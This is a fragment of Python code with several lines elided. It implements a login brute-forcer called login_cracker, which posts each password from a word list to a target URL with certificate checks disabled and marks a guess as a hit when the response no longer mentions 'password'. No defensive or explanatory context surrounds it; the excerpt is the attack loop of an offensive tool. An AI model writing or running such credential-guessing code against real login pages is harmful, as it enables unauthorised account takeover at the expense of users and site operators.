...
def login_cracker(url, user_name = "", word_list = "", secure = True):
    ...
    with open(word_list, "r") as f:
        for i in f:
            ...
            try:
                verify = requests.post(my_url, data = payload, verify = False, headers = user_agent, timeout = (5, 30)).text

                if "password" not in verify.lower() and len(verify) > 0:
                    print("True: " + key)
                    break

                if "password" in verify.lower() and len(verify) > 0:
                    print("False: "+ key)
